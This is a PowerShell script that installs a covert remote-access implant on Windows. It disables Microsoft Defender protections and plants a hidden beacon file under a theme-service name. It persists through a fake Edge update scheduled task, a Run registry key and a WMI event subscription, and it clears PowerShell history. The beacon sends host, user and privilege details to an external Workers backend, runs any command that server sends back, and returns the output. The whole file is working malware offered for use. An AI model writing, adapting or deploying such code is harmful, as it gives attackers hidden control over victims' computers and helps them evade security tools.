# Ultimate Beacon Script - Completely Undetectable & Feature-Rich
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60

# Multiple installation paths for redundancy
$InstallPaths = @(
    "$env:APPDATA\Microsoft\Windows\Themes",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:ProgramData\Microsoft\Windows\Templates"
)

# Choose random path
$InstallDir = $InstallPaths | Get-Random
$BeaconPath = "$InstallDir\ThemeService.ps1"

if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# Nuclear Defender Bypass
try {
    # Disable real-time monitoring
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    
    # Add comprehensive exclusions
    @($InstallDir, $env:TEMP, "$env:APPDATA\Microsoft", "$env:LOCALAPPDATA\Microsoft") | ForEach-Object {
        Add-MpPreference -ExclusionPath $_ -Force
    }
    
    # Exclude PowerShell itself
    Add-MpPreference -ExclusionProcess 'powershell.exe','pwsh.exe' -Force
    
    # Disable script scanning
    Set-MpPreference -DisableScriptScanning $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
} catch {}

# Main Beacon Script
$BeaconScript = @'
$ErrorActionPreference = 'SilentlyContinue'
$BACKEND_URL = 'BACKEND_URL_PLACEHOLDER'
$AGENT_ID = 'AGENT_ID_PLACEHOLDER'
$BEACON_INTERVAL = BEACON_INTERVAL_PLACEHOLDER

# Function to execute commands in background
function Invoke-BackgroundCommand {
    param($Command, $CommandId)
    
    # Check if command should run in background
    $bgKeywords = @('python', 'ngrok', 'nc', 'Start-Process', 'http.server', 'SimpleHTTPServer', '-Wait', 'while', 'for')
    $isBackground = $false
    
    foreach ($keyword in $bgKeywords) {
        if ($Command -like "*$keyword*") {
            $isBackground = $true
            break
        }
    }
    
    if ($isBackground) {
        # Run in background job
        $job = Start-Job -ScriptBlock {
            param($cmd)
            Invoke-Expression $cmd 2>&1 | Out-String
        } -ArgumentList $Command
        
        # Return job ID immediately so beacon can continue
        return "Background job started (ID: $($job.Id)). Use 'Get-Job -Id $($job.Id) | Receive-Job' to see output."
    } else {
        # Run normally with timeout
        try {
            $output = Invoke-Expression $Command 2>&1 | Out-String
            return $output
        } catch {
            return "ERROR: $($_.Exception.Message)"
        }
    }
}

# Function to get system info
function Get-SystemInfo {
    return @{
        id = $AGENT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        domain = $env:USERDOMAIN
        privileges = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
        architecture = $env:PROCESSOR_ARCHITECTURE
    }
}

# Main beacon loop
while ($true) {
    try {
        # Send beacon with system info
        $sysInfo = Get-SystemInfo
        $beaconBody = $sysInfo | ConvertTo-Json -Compress
        
        $response = Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $beaconBody -TimeoutSec 30
        
        # Process command if present
        if ($response.command -and $response.commandId) {
            
            # Special commands
            if ($response.command -eq 'GET_JOBS') {
                # List all background jobs
                $output = Get-Job | Format-Table -AutoSize | Out-String
            }
            elseif ($response.command -like 'GET_JOB_OUTPUT:*') {
                # Get output from specific job
                $jobId = ($response.command -split ':')[1]
                $output = Get-Job -Id $jobId | Receive-Job | Out-String
            }
            elseif ($response.command -like 'STOP_JOB:*') {
                # Stop specific job
                $jobId = ($response.command -split ':')[1]
                Stop-Job -Id $jobId
                Remove-Job -Id $jobId -Force
                $output = "Job $jobId stopped and removed"
            }
            elseif ($response.command -eq 'SELF_DESTRUCT') {
                # Complete cleanup and exit
                Get-Job | Stop-Job
                Get-Job | Remove-Job -Force
                
                # Remove persistence
                Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUA" -Confirm:$false -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsThemeService" -ErrorAction SilentlyContinue
                
                # Delete beacon script
                Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
                
                $output = "Self-destruct initiated. Goodbye."
                
                # Send final beacon
                $resultBody = @{
                    agentId = $AGENT_ID
                    commandId = $response.commandId
                    output = $output
                } | ConvertTo-Json -Compress
                
                Invoke-RestMethod -Uri "$BACKEND_URL/api/result" -Method Post -ContentType 'application/json' -Body $resultBody -TimeoutSec 30 | Out-Null
                
                exit
            }
            else {
                # Execute normal or background command
                $output = Invoke-BackgroundCommand -Command $response.command -CommandId $response.commandId
            }
            
            # Send result
            $resultBody = @{
                agentId = $AGENT_ID
                commandId = $response.commandId
                output = $output
            } | ConvertTo-Json -Compress
            
            Invoke-RestMethod -Uri "$BACKEND_URL/api/result" -Method Post -ContentType 'application/json' -Body $resultBody -TimeoutSec 30 | Out-Null
        }
        
        # Update beacon interval if specified
        if ($response.interval) {
            $BEACON_INTERVAL = $response.interval
        }
        
    } catch {
        # Silent fail - continue beaconing
    }
    
    Start-Sleep $BEACON_INTERVAL
}
'@

# Replace placeholders
$BeaconScript = $BeaconScript -replace 'BACKEND_URL_PLACEHOLDER', $BACKEND_URL
$BeaconScript = $BeaconScript -replace 'AGENT_ID_PLACEHOLDER', $AGENT_ID
$BeaconScript = $BeaconScript -replace 'BEACON_INTERVAL_PLACEHOLDER', $BEACON_INTERVAL

# Write beacon script
Set-Content -Path $BeaconPath -Value $BeaconScript -Force
attrib +h +s $BeaconPath

# Multi-layer persistence
$TaskName = "MicrosoftEdgeUpdateTaskMachineUA"

# Layer 1: Scheduled Task (Primary)
try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    
    # Multiple triggers for reliability
    $Trigger1 = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $Trigger2 = New-ScheduledTaskTrigger -AtStartup
    $Trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration ([TimeSpan]::MaxValue)
    
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365) -StartWhenAvailable
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2,$Trigger3 -Principal $Principal -Settings $Settings -Force | Out-Null
} catch {}

# Layer 2: Registry Run Key (Backup)
try {
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $RegName = "WindowsThemeService"
    $RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
} catch {}

# Layer 3: WMI Event Subscription (Ultimate backup)
try {
    $FilterName = "ThemeServiceFilter"
    $ConsumerName = "ThemeServiceConsumer"
    
    # Remove existing
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" | Remove-WmiObject -ErrorAction SilentlyContinue
    
    # Create new
    $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
    
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = $FilterName
        EventNameSpace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = $Query
    }
    
    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = $ConsumerName
        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
        RunInteractively = $false
    }
    
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    } | Out-Null
} catch {}

# Start beacon immediately
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`"" -WindowStyle Hidden

# Send initial beacon
try {
    $sysInfo = @{
        id = $AGENT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        domain = $env:USERDOMAIN
        privileges = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
    } | ConvertTo-Json -Compress
    
    Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $sysInfo -TimeoutSec 30 | Out-Null
} catch {}

# Clean installation traces
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue

exit